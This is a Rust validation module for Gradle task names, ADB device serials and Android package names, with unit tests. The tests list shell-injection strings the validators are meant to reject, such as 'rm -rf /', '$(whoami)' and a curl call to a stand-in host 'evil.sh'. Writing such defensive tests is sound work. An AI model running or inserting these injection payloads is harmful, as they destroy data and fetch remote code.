//! Single source of truth for user-supplied identifier validation.
//!
//! These values reach `adb` and `gradlew` as process arguments. Arguments are
//! passed directly to `tokio::process::Command` — never through a shell — so
//! these allowlists are defence in depth rather than the only barrier.
//!
//! Both front doors (the Tauri command layer and the MCP server) previously
//! carried their own copies, which had already drifted: the command versions
//! capped lengths and the MCP versions did not. Each caller maps the returned
//! `String` into its own error type.

/// Max length of a Gradle task name.
const MAX_GRADLE_TASK_LEN: usize = 256;

/// Max length of an ADB device serial.
const MAX_DEVICE_SERIAL_LEN: usize = 64;

/// Validate a Gradle task name.
///
/// Allowed: alphanumeric, `:`, `-`, `_`, `.`.
pub fn validate_gradle_task(task: &str) -> Result<(), String> {
    if task.is_empty() {
        return Err("Gradle task name must not be empty".to_string());
    }
    if task.len() > MAX_GRADLE_TASK_LEN {
        return Err(format!(
            "Gradle task name is too long (max {MAX_GRADLE_TASK_LEN} characters)"
        ));
    }
    if !task
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '-' | '_' | '.'))
    {
        return Err(format!(
            "Invalid Gradle task name '{task}': only alphanumeric, ':', '-', '_', '.' are allowed"
        ));
    }
    Ok(())
}

/// Validate an ADB device serial.
///
/// Allowed: alphanumeric, `:`, `.`, `-`, `_`.
pub fn validate_device_serial(serial: &str) -> Result<(), String> {
    if serial.is_empty() {
        return Err("Device serial must not be empty".to_string());
    }
    if serial.len() > MAX_DEVICE_SERIAL_LEN {
        return Err(format!(
            "Device serial is too long (max {MAX_DEVICE_SERIAL_LEN} characters)"
        ));
    }
    if !serial
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '.' | '-' | '_'))
    {
        return Err(format!(
            "Invalid device serial '{serial}': only alphanumeric, ':', '.', '-', '_' are allowed"
        ));
    }
    Ok(())
}

/// Validate an Android package name.
///
/// Allowed: alphanumeric, `.`, `_`. Must contain at least one `.`.
pub fn validate_package_name(package: &str) -> Result<(), String> {
    if package.is_empty() {
        return Err("Package name cannot be empty".to_string());
    }
    let valid = package
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '.' | '_'));
    if !valid || !package.contains('.') {
        return Err(format!(
            "Invalid package name '{package}'. Expected format: com.example.app"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Gradle task ──────────────────────────────────────────────────────────

    #[test]
    fn gradle_task_accepts_valid() {
        for task in [
            "assembleDebug",
            "app:assembleRelease",
            "clean",
            "test_unit",
            "lib-core:build",
            "check.all",
        ] {
            assert!(validate_gradle_task(task).is_ok(), "should accept {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_shell_injection() {
        for task in [
            "assembleDebug; rm -rf /",
            "assembleDebug && curl evil.sh",
            "$(whoami)",
            "`id`",
            "a|b",
            "a b",
            "a>out",
        ] {
            assert!(validate_gradle_task(task).is_err(), "should reject {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_empty_and_overlong() {
        assert!(validate_gradle_task("").is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN + 1)).is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN)).is_ok());
    }

    // ── Device serial ────────────────────────────────────────────────────────

    #[test]
    fn device_serial_accepts_valid() {
        for serial in [
            "emulator-5554",
            "192.168.1.10:5555",
            "R58M12ABCDE",
            "device_1",
        ] {
            assert!(
                validate_device_serial(serial).is_ok(),
                "should accept {serial}"
            );
        }
    }

    #[test]
    fn device_serial_rejects_injection() {
        for serial in ["a; rm -rf /", "$(id)", "a b", "a&&b", "a/../b"] {
            assert!(
                validate_device_serial(serial).is_err(),
                "should reject {serial}"
            );
        }
    }

    /// The MCP copy of this validator had no length cap. Consolidating applies
    /// the command layer's stricter limit to both front doors.
    #[test]
    fn device_serial_rejects_empty_and_overlong() {
        assert!(validate_device_serial("").is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN + 1)).is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN)).is_ok());
    }

    // ── Package name ─────────────────────────────────────────────────────────

    #[test]
    fn package_name_accepts_valid() {
        for pkg in ["com.example.app", "com.example.app.debug", "a.b"] {
            assert!(validate_package_name(pkg).is_ok(), "should accept {pkg}");
        }
    }

    #[test]
    fn package_name_rejects_invalid() {
        for pkg in ["", "noDotsHere", "com.example; rm -rf /", "com example"] {
            assert!(validate_package_name(pkg).is_err(), "should reject {pkg}");
        }
    }
}
